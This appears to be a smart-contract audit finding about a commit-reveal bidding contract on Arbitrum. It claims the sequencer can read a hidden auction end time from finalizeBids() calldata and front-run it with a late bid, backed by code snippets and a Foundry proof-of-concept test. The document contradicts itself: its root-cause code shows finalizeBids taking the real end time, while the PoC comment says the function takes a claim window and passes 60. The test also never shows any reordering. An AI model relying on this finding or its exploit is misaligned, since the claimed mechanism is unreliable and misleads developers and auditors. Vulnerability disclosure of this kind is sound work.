# [000946] Arbitrum Sequencer Can FrontRun finalizeBids() to Place Bids After Real Deadline
  
  ### Summary

The protocol implements a commit reveal scheme to prevent bid sniping by hiding the true auction end time in a hash which is a good security feature as the goal is to maintain fairness in those bidding project. However, the reveal and finalization happen in a single transaction (finalizeBids()), which allows the Arbitrum sequencer to extract the real end time from the mempool and insert/reorder their own bid transaction before finalization executes. This completely defeats the fairness mechanism the commit reveal scheme was designed to provide.

### Root Cause

The Intended Security Model:
The protocol launches bidding projects with two end times:
Fake end time - Set far in the future and stored on chain
Real end time - Hidden in a hash (endTimeHash) that only the owner knows.

The placeBid() function checks:
```solidity
require(block.timestamp >= startTime && block.timestamp <= endTime, "Invalid time");
```
Since endTime is the fake far future time, bids are technically valid until the owner calls finalizeBids() with the real end time. The commit reveal scheme is supposed to prevent anyone from knowing when bidding truly ends.

Now it gets interesting as the flaw is when the owner calls finalizeBids(), they must provide the real end time as a parameter to prove it matches the hash:
```solidity 
function finalizeBids(
    uint256 projectId,
    bytes32 refundRoot,
    bytes32[] calldata poolRoots,
    uint256 endTime  // Real end time revealed here
) external onlyOwner {
    BiddingProject storage project = biddingProjects[projectId];
    
    // Verify the revealed end time matches the committed hash
    require(
        keccak256(abi.encodePacked(endTime)) == project.endTimeHash,
        "Invalid end time"
    );
    
    project.closed = true;
    project.endTime = block.timestamp;
    // ... rest of finalization logic
}
```
This creates a one transaction reveal and close pattern. The problem is that on Arbitrum, the sequencer sees this transaction in the mempool before it executes. The sequencer can:
Read the calldata and extract endTime
Realize the real deadline was 7 days ago, but the contract still accepts bids.
Submit their own placeBid() transaction
Reorder transactions so their bid executes before finalizeBids()

why this works? well the sequencer controls transaction ordering within blocks on Arbitrum. When they see the finalizeBids() transaction:
Before reordering:
```text
Block N: [finalizeBids(realEndTime)]
```
After sequencer reordering:
```text
Block N: [sequencer_placeBid(), finalizeBids(realEndTime)]
```
The sequencer's bid executes first and passes all checks:
block.timestamp <= endTime ✓ (endTime is still the fake farfuture time)
!project.closed ✓ (closed flag not set until finalizeBids runs)

Then finalizeBids() executes second, closing the auction with the sequencer's bid included.

By front running the finalization, the sequencer gains complete visibility into:
All legitimate bids and their amounts
The exact pool structure and token pricing
The real auction deadline that has already passed
hereby giving him an unfair advantage.

They can then place a perfectly optimized bid to maximize their allocation while spending the minimum necessary, something no honest bidder could do. The commit reveal scheme that was supposed to prevent this exact scenario is completely bypassed.

> [https://github.com/dualguard/2025-11-alignerz/blob/f7eeed88d91356484c02af6f38b71f27b790828c/protocol/src/contracts/vesting/AlignerzVesting.sol#L708](url)

> [https://github.com/dualguard/2025-11-alignerz/blob/f7eeed88d91356484c02af6f38b71f27b790828c/protocol/src/contracts/vesting/AlignerzVesting.sol#L783](url)

### Internal Pre-conditions

1. Owner needs to call finalize bid function providing or rather revealing the real end time.

### External Pre-conditions

1. Since the protocol is deploying to Arbitrum Sequencer will always be available.

### Attack Path

Setup: Project with fake far future endTime and real endTime hidden in hash
Legitimate bid: User bids during valid period
Time passes: Real end time passes (bidding should be closed)
Owner finalizes: Submits finalizeBids(realEndTime, ...) to mempool
Sequencer: Sees the transaction, extracts realEndTime, places own bid
Reordering: Sequencer ensures their bid executes before finalization
Result: Sequencer bid placed after real deadline but accepted by contract.

### Impact

Complete failure of auction fairness:
The commit reveal mechanism provides zero protection against sequencer manipulation.
Sequencer can bid after the real deadline with full knowledge of all other bids.

### PoC

```solidity
function test_SequencerFrontRunsFinalizeBids() public {
        // Setup: Project with fake far-future endTime
        vm.startPrank(projectCreator);
        vesting.setVestingPeriodDivisor(1);
        
        uint256 realEndTime = block.timestamp + 7 days;
        uint256 fakeEndTime = block.timestamp + 365 days; // Far future to hide real end
        
        vesting.launchBiddingProject(
            address(token),
            address(usdt),
            block.timestamp,
            fakeEndTime, // Fake end time
            keccak256(abi.encodePacked(realEndTime)), // Hash of real end time
            true
        );
        
        vesting.createPool(PROJECT_ID, 10_000_000 ether, 0.01 ether, true);
        vesting.addUsersToWhitelist(bidders, PROJECT_ID);
        vm.stopPrank();

        // Phase 1: Legitimate users place bids during valid period
        address legitUser = bidders[0];
        uint256 legitBidAmount = 5_000 ether;
        
        usdt.mint(legitUser, legitBidAmount);
        vm.startPrank(legitUser);
        usdt.approve(address(vesting), legitBidAmount);
        vesting.placeBid(PROJECT_ID, legitBidAmount, 180 days);
        vm.stopPrank();

        // Phase 2: Real end time passes - bidding should be closed
        vm.warp(realEndTime + 1 days);

        // Phase 3: Owner prepares to finalize with real end time
        // Generate merkle proofs for legitimate bid
        // Note: CompleteMerkle requires at least 2 leaves, so we add a dummy bid
        BidInfo[] memory bids = new BidInfo[](2);
        bids[0] = BidInfo({
            bidder: legitUser,
            amount: legitBidAmount,
            vestingPeriod: 180 days,
            poolId: 0,
            accepted: true
        });
        bids[1] = BidInfo({
            bidder: makeAddr("dummy"),
            amount: 1 ether,
            vestingPeriod: 180 days,
            poolId: 0,
            accepted: true
        });
        
        bytes32[] memory poolRoots = new bytes32[](1);
        poolRoots[0] = generateMerkleProofs(bids, 0);

        // Phase 4: ATTACK - Sequencer sees finalizeBids in mempool
        // The finalizeBids transaction reveals realEndTime in calldata
        // Sequencer extracts: realEndTime = block.timestamp - 1 day
        
        // Sequencer is also a whitelisted address (common in protocol governance)
        address sequencer = bidders[1];
        // Note: bidders[1] is already whitelisted above, so no need to whitelist again
        
        uint256 sequencerBidAmount = 10_000 ether;
        usdt.mint(sequencer, sequencerBidAmount);

        // Phase 5: Sequencer FRONT-RUNS by reordering transactions
        // Note: This is front-running (not back-running) because:
        // - Sequencer sees finalizeBids in mempool FIRST (observation)
        // - But reorders so their placeBid executes BEFORE finalizeBids (execution)
        // - Front-run = your tx executes BEFORE target tx
        // - Back-run = your tx executes AFTER target tx
        // Instead of: [finalizeBids]
        // Sequencer creates: [sequencer_placeBid, finalizeBids]
        
        // The sequencer's bid transaction executes FIRST (front-running)
        vm.startPrank(sequencer);
        usdt.approve(address(vesting), sequencerBidAmount);
        
        // This should fail if bidding was actually closed, but it succeeds
        // because the contract still has fakeEndTime = 365 days in future
        vesting.placeBid(PROJECT_ID, sequencerBidAmount, 180 days);
        vm.stopPrank();
        
        // Verify sequencer's bid was recorded by checking contract balance increased
        uint256 contractBalance = usdt.balanceOf(address(vesting));
        assertTrue(contractBalance >= legitBidAmount + sequencerBidAmount, "Sequencer bid not recorded");

        // Phase 6: Now finalizeBids executes (second in block)
        // Note: finalizeBids takes claimWindow (in seconds), not realEndTime
        vm.prank(projectCreator);
        vesting.finalizeBids(PROJECT_ID, bytes32(0), poolRoots, 60);

        // Phase 7: Verify the attack succeeded
        // Sequencer placed bid AFTER real end time but BEFORE finalization
        // This defeats the entire commit-reveal scheme
        
        // The sequencer now has insider information:
        // 1. Knows all legitimate bids and amounts
        // 2. Knows the pool structure and pricing
        // 3. Can optimize their bid to win at minimal cost
        // 4. Legitimate users who bid honestly are disadvantaged

        emit log_named_address("Attacker (Sequencer)", sequencer);
        emit log_named_uint("Sequencer bid amount", sequencerBidAmount / 1e18);
        emit log_named_uint("Bid placed at timestamp", block.timestamp);
        emit log_named_uint("Real end time was", realEndTime);
        emit log_named_uint("Days after real end", (block.timestamp - realEndTime) / 1 days);
    }

    // Helper function to create single-element array
    function _toArray(address addr) internal pure returns (address[] memory) {
        address[] memory arr = new address[](1);
        arr[0] = addr;
        return arr;
    }
```

### Mitigation

The proper yet still need to be reviewed mitigation i can suggest is Implement a true two phase commit reveal scheme.
  